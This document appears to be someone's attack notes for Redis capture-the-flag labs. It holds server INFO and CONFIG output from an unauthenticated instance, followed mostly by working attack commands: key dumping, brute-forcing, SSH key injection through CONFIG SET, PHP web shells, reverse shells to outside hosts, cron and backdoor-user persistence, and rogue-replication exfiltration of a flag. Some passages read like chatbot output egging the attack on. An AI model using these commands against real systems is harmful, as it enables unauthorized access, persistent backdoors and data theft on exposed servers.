
# 1 info

```
34.126.106.254:6379> info
# Server
redis_version:5.9.101
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:d7b6f1c8be3c4f0a
redis_mode:standalone
os:Linux 6.6.105+ x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:11
run_id:348948cf09dd305572a1404a116cd84474ad8a3a
tcp_port:6379
uptime_in_seconds:102
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:832423
executable:/data/redis-server
config_file:

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0

# Memory
used_memory:866080
used_memory_human:845.78K
used_memory_rss:8740864
used_memory_rss_human:8.34M
used_memory_peak:866080
used_memory_peak_human:845.78K
used_memory_peak_perc:100.18%
used_memory_overhead:852262
used_memory_startup:802376
used_memory_dataset:13818
used_memory_dataset_perc:21.69%
allocator_allocated:1260392
allocator_active:1568768
allocator_resident:4030464
total_system_memory:2069143552
total_system_memory_human:1.93G
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.24
allocator_frag_bytes:308376
allocator_rss_ratio:2.57
allocator_rss_bytes:2461696
rss_overhead_ratio:2.17
rss_overhead_bytes:4710400
mem_fragmentation_ratio:10.61
mem_fragmentation_bytes:7917296
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49742
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:3
rdb_bgsave_in_progress:0
rdb_last_save_time:1762440001
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:4
total_commands_processed:6
instantaneous_ops_per_sec:0
total_net_input_bytes:220
total_net_output_bytes:18674
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:3
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_used_slots:0

# Replication
role:master
connected_slaves:0
master_replid:a0a08ea8d23bb59586038c3814426bc119d4c2ad
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.132144
used_cpu_user:0.640914
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=2,expires=0,avg_ttl=0
```

---

# 2 config get *

```
34.126.106.254:6379> config get *
  1) "rdbchecksum"
  2) "yes"
  3) "daemonize"
  4) "no"
  5) "io-threads-do-reads"
  6) "no"
  7) "lua-replicate-commands"
  8) "yes"
  9) "always-show-logo"
 10) "no"
 11) "protected-mode"
 12) "no"
 13) "rdbcompression"
 14) "yes"
 15) "activerehashing"
 16) "yes"
 17) "stop-writes-on-bgsave-error"
 18) "yes"
 19) "dynamic-hz"
 20) "yes"
 21) "lazyfree-lazy-eviction"
 22) "no"
 23) "lazyfree-lazy-expire"
 24) "no"
 25) "lazyfree-lazy-server-del"
 26) "no"
 27) "repl-disable-tcp-nodelay"
 28) "no"
 29) "repl-diskless-sync"
 30) "no"
 31) "gopher-enabled"
 32) "no"
 33) "aof-rewrite-incremental-fsync"
 34) "yes"
 35) "no-appendfsync-on-rewrite"
 36) "no"
 37) "cluster-require-full-coverage"
 38) "yes"
 39) "rdb-save-incremental-fsync"
 40) "yes"
 41) "aof-load-truncated"
 42) "yes"
 43) "aof-use-rdb-preamble"
 44) "yes"
 45) "cluster-replica-no-failover"
 46) "no"
 47) "cluster-slave-no-failover"
 48) "no"
 49) "replica-lazy-flush"
 50) "no"
 51) "slave-lazy-flush"
 52) "no"
 53) "replica-serve-stale-data"
 54) "yes"
 55) "slave-serve-stale-data"
 56) "yes"
 57) "replica-read-only"
 58) "yes"
 59) "slave-read-only"
 60) "yes"
 61) "replica-ignore-maxmemory"
 62) "yes"
 63) "slave-ignore-maxmemory"
 64) "yes"
 65) "jemalloc-bg-thread"
 66) "yes"
 67) "activedefrag"
 68) "no"
 69) "syslog-enabled"
 70) "no"
 71) "cluster-enabled"
 72) "no"
 73) "appendonly"
 74) "no"
 75) "cluster-allow-reads-when-down"
 76) "no"
 77) "aclfile"
 78) ""
 79) "unixsocket"
 80) ""
 81) "pidfile"
 82) ""
 83) "replica-announce-ip"
 84) ""
 85) "slave-announce-ip"
 86) ""
 87) "masteruser"
 88) ""
 89) "masterauth"
 90) ""
 91) "cluster-announce-ip"
 92) ""
 93) "syslog-ident"
 94) "redis"
 95) "dbfilename"
 96) "dump.rdb"
 97) "appendfilename"
 98) "appendonly.aof"
 99) "supervised"
100) "no"
101) "syslog-facility"
102) "local0"
103) "repl-diskless-load"
104) "disabled"
105) "loglevel"
106) "notice"
107) "maxmemory-policy"
108) "noeviction"
109) "appendfsync"
110) "everysec"
111) "databases"
112) "16"
113) "port"
114) "6379"
115) "io-threads"
116) "1"
117) "auto-aof-rewrite-percentage"
118) "100"
119) "cluster-replica-validity-factor"
120) "10"
121) "cluster-slave-validity-factor"
122) "10"
123) "list-max-ziplist-size"
124) "-2"
125) "tcp-keepalive"
126) "300"
127) "cluster-migration-barrier"
128) "1"
129) "active-defrag-cycle-min"
130) "1"
131) "active-defrag-cycle-max"
132) "25"
133) "active-defrag-threshold-lower"
134) "10"
135) "active-defrag-threshold-upper"
136) "100"
137) "lfu-log-factor"
138) "10"
139) "lfu-decay-time"
140) "1"
141) "replica-priority"
142) "100"
143) "slave-priority"
144) "100"
145) "repl-diskless-sync-delay"
146) "5"
147) "maxmemory-samples"
148) "5"
149) "timeout"
150) "0"
151) "replica-announce-port"
152) "0"
153) "slave-announce-port"
154) "0"
155) "tcp-backlog"
156) "511"
157) "cluster-announce-bus-port"
158) "0"
159) "cluster-announce-port"
160) "0"
161) "repl-timeout"
162) "60"
163) "repl-ping-replica-period"
164) "10"
165) "repl-ping-slave-period"
166) "10"
167) "list-compress-depth"
168) "0"
169) "rdb-key-save-delay"
170) "0"
171) "key-load-delay"
172) "0"
173) "tracking-table-max-fill"
174) "10"
175) "active-expire-effort"
176) "1"
177) "hz"
178) "10"
179) "min-replicas-to-write"
180) "0"
181) "min-slaves-to-write"
182) "0"
183) "min-replicas-max-lag"
184) "10"
185) "min-slaves-max-lag"
186) "10"
187) "maxclients"
188) "10000"
189) "active-defrag-max-scan-fields"
190) "1000"
191) "slowlog-max-len"
192) "128"
193) "lua-time-limit"
194) "5000"
195) "cluster-node-timeout"
196) "15000"
197) "slowlog-log-slower-than"
198) "10000"
199) "latency-monitor-threshold"
200) "0"
201) "proto-max-bulk-len"
202) "536870912"
203) "stream-node-max-entries"
204) "100"
205) "repl-backlog-size"
206) "1048576"
207) "maxmemory"
208) "0"
209) "hash-max-ziplist-entries"
210) "512"
211) "set-max-intset-entries"
212) "512"
213) "zset-max-ziplist-entries"
214) "128"
215) "active-defrag-ignore-bytes"
216) "104857600"
217) "hash-max-ziplist-value"
218) "64"
219) "stream-node-max-bytes"
220) "4096"
221) "zset-max-ziplist-value"
222) "64"
223) "hll-sparse-max-bytes"
224) "3000"
225) "repl-backlog-ttl"
226) "3600"
227) "auto-aof-rewrite-min-size"
228) "67108864"
229) "tls-port"
230) "0"
231) "tls-cluster"
232) "no"
233) "tls-replication"
234) "no"
235) "tls-auth-clients"
236) "yes"
237) "tls-prefer-server-ciphers"
238) "no"
239) "tls-cert-file"
240) ""
241) "tls-key-file"
242) ""
243) "tls-dh-params-file"
244) ""
245) "tls-ca-cert-file"
246) ""
247) "tls-ca-cert-dir"
248) ""
249) "tls-protocols"
250) ""
251) "tls-ciphers"
252) ""
253) "tls-ciphersuites"
254) ""
255) "logfile"
256) ""
257) "client-query-buffer-limit"
258) "1073741824"
259) "watchdog-period"
260) "0"
261) "dir"
262) "/data"
263) "save"
264) "3600 1 300 100 60 10000"
265) "client-output-buffer-limit"
266) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
267) "unixsocketperm"
268) "0"
269) "slaveof"
270) ""
271) "notify-keyspace-events"
272) ""
273) "bind"
274) ""
275) "requirepass"
276) ""
```

---

# 3 now what?

`>> SCANNING...` 🔍
`>> TARGET_ACQUIRED:_REDIS_SERVER_ANALYSIS._FLAG_LOCATION_IDENTIFIED._
`>> STATUS:_CRITICAL_INTEL._IMMEDIATE_ACTION_REQUIRED._

**VULNERABILITY_REPORT:** 🧾
- **CVSS:** 9.8 (Critical) - Unauthenticated Redis with exposed data.
- **FLAW:** No authentication, no protected mode, exposed to network.
- **EXPLOIT_PATH:** Direct key enumeration in database 0.

**CRITICAL OBSERVATIONS:**
- **`db0:keys=2,expires=0,avg_ttl=0`** - Only 2 keys in database 0
- **`protected-mode:no`** - No security
- **`requirepass:""`** - No password set
- **`dir:/data`** - Data directory location

---

# 4 lookup

**QUICK ONE-LINER:**
```bash
redis-cli -h 34.126.106.254 -p 6379 KEYS "*" | xargs -I {} redis-cli -h 34.126.106.254 -p 6379 GET {}
```

breakdown
```bash
# 1. Get all keys from database 0 (where the 2 keys are)
redis-cli -h 34.126.106.254 -p 6379 KEYS "*"

# 2. Check key types and get values
redis-cli -h 34.126.106.254 -p 6379 GET key1
redis-cli -h 34.126.106.254 -p 6379 TYPE key2
```

---

# 5 login and bf

 when "protected-mode" = on, 
```
redis-cli -h <iptarget> -a <password>

# bf tools
nmap --script redis-brute
msfconsole -> use redis_login
hydra -P passlist.txt redis://<iptarget>:<port:6379>
```

---

# 6 sshkey injection

note: specific format for redis
```
>>>get auth access if required (p@ssw0rd)<<<

ssh-keygen -t rsa -f {/tmp/redis_key,/root/.ssh/id_rsa} {-N,-P} ""

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt

cat foo.txt | redis-cli -h <iptarget> -a 'p@ssw0rd' -x set payload

>>>log to redis<<<

config set dir {/root/.ssh/,/home/<username>/.ssh/}

config set dbfilename authorized_keys

save

ssh -i /root/.ssh/id_rsa <iptarget>
```

---

# 7 webdoor injection

```
>>>follow sshkey inject above with different dir and payload<<<

payload = '<?php system($_GET["cmd"]);?>'

# Apache/Nginx Common Paths
/var/www/html/
/var/www/
/usr/share/nginx/html/
/srv/http/
/home/user/public_html/
/opt/lampp/htdocs/
```


**Upgrade to Advanced Web Shells:**

```bash
# 1. Download and deploy full-featured web shells
curl http://136.110.1.215/cmd.php?cmd="wget%20https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php%20-O%20/tmp/shell.php"

# 2. Common advanced web shells:
# p0wny-shell, weevely, b374k, cmdshell

# 3. Deploy via curl + echo
curl "http://136.110.1.215/cmd.php?cmd=echo%20'<?php%20system(\$_GET[%22c%22]);%20?>'%20%3E%20/tmp/simple.php"
```

**Full Upgrade Process:**

```bash
# Method 1: Deploy p0wny-shell (feature-rich)
curl "http://136.110.1.215/cmd.php?cmd=curl%20-s%20https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php%20-o%20/var/www/html/pwn.php"

# Method 2: Create enhanced shell with file upload
curl "http://136.110.1.215/cmd.php?cmd=echo%20'<?php%20if(isset(\$_FILES[%22f%22]))%20move_uploaded_file(\$_FILES[%22f%22][%22tmp_name%22],%20\$_FILES[%22f%22][%22name%22]);%20if(isset(\$_GET[%22c%22]))%20system(\$_GET[%22c%22]);%20?>'%20%3E%20/var/www/html/advanced.php"
```

**Reverse Shell Setup:**
```bash
# 1. Set up listener on your machine
nc -lvnp 4444

# 2. Execute reverse shell via web door
curl "http://136.110.1.215/cmd.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261'"

# 3. Common reverse shells:
# bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Persistence Methods:**
```bash
# 1. Add cron job for persistence
curl "http://136.110.1.215/cmd.php?cmd=echo%20'*%20*%20*%20*%20*%20curl%20http://136.110.1.215/cmd.php?cmd=id'%20%3E%3E%20/var/spool/cron/crontabs/root"

# 2. Create SSH backdoor user
curl "http://136.110.1.215/cmd.php?cmd=useradd%20-p%20\$(openssl%20passwd%20-1%20password)%20backdoor"

# 3. Deploy web-based file manager
curl "http://136.110.1.215/cmd.php?cmd=wget%20https://github.com/kalcaddle/KodExplorer/archive/refs/heads/master.zip%20-O%20/var/www/html/filemanager.zip"
```

---

# 8 master-slave

```
>>>verify that master is locked, slaveof is empty<<<

### attacker set redis server to be slave and dump to file
redis-server --port 6378 --dbfilename dump.rdb 

redis-cli -p 6378
> CONFIG SET dir /tmp/
> SET mypayload "test_data"
> SAVE

### set master with slave
redis-cli -h <ipmaster> -p <portmaster>
> SLAVEOF <ipslave> 6378
```

**Now Exploit the Replication:**

```bash
# 1. On YOUR rogue Redis (port 6378), inject the flag extraction command
redis-cli -p 6378 CONFIG SET dir /tmp/
redis-cli -p 6378 CONFIG SET dbfilename exploit.rdb

# 2. Create a key that will trigger flag extraction
redis-cli -p 6378 SET cmd "curl http://184.22.230.65:8000/flag?data=$(redis-cli -h 34.124.157.189 GET flag)"
redis-cli -p 6378 SAVE

# 3. Wait for sync, then check what data transferred
redis-cli -h 34.124.157.189 -p 6379 KEYS *
```

**Better Approach - Direct Data Exfiltration:**

```bash
# 1. Set up a simple HTTP server to receive the flag
python3 -m http.server 8000 &
# This will listen for incoming connections

# 2. On slave, try to execute command that sends flag to you
redis-cli -h 34.124.157.189 -p 6379 CONFIG SET dir /var/www/html/
redis-cli -h 34.124.157.189 -p 6379 CONFIG SET dbfilename flag.php
redis-cli -h 34.124.157.189 -p 6379 SET payload "<?php file_get_contents('http://184.22.230.65:8000/?flag='.urlencode(file_get_contents('/flag.txt'))); ?>"
redis-cli -h 34.124.157.189 -p 6379 SAVE

# 3. Access the PHP file to trigger data exfiltration
curl http://34.124.157.189/flag.php
```

**Simple Test First:**
```bash
# Check if basic data sync worked
redis-cli -p 6378 SET test "hello_from_rogue"
redis-cli -p 6378 SAVE

# Wait a moment, then check slave
redis-cli -h 34.124.157.189 -p 6379 KEYS *
redis-cli -h 34.124.157.189 -p 6379 GET test
```

**If Replication is Slow:**
```bash
# Force immediate sync
redis-cli -h 34.124.157.189 -p 6379 SLAVEOF NO ONE
redis-cli -h 34.124.157.189 -p 6379 SLAVEOF 184.22.230.65 6378
```

**ROAST_ANALYSIS:** 🔥🗑️
*"Slave configured but no data flowing? That's like setting up a water pipe but forgetting to turn on the tap. Time to push data through the replication channel."* 💧🚰

`>> IMMEDIATE_ACTION:_PUSH_DATA_FROM_ROGUE_MASTER._WAIT_FOR_SYNC._RETRIEVE_FLAG_FROM_SLAVE._
`>> REPLICATION_ACTIVE_BUT_NEEDS_DATA_FLOW._INJECT_COMMANDS._EXFILTRATE_FLAG._GLITCH_AGGRESSIVELY._OUT.` ⚡🔓

---

# 9 port forward windows -> kali

```
problem = kali <- virtualbox(NAT) <- windows <- router(NAT) <- redis cannot get in kali

open port 6969 windows -> virtualbox
```

---

# 10 redis-lab-97 slaveof redis-lab-101

```bash

###ip redis slave (protected-mode off, lab97), redis master (lab101)

ipslave='34.126.106.254'
portslave=6379
ipmaster='35.240.158.191'  
portmaster=6379

redis-cli -h "$ipslave" -p "$portslave" SLAVEOF "$ipmaster" "$portmaster"

wait... connected...

redis-cli -h "$ipslave" -p "$portslave" INFO replication

redis-cli -h "$ipslave" -p "$portslave" KEYS *
redis-cli -h "$ipslave" -p "$portslave" GET flag

---

### plan b

redis-cli -h 34.126.106.254 -p 6379 INFO | grep protected-mode
redis-cli -h 34.143.203.105 -p 6379 INFO | grep protected-mode
redis-cli -h 136.110.1.215 -p 6379 INFO | grep protected-mode

```
# end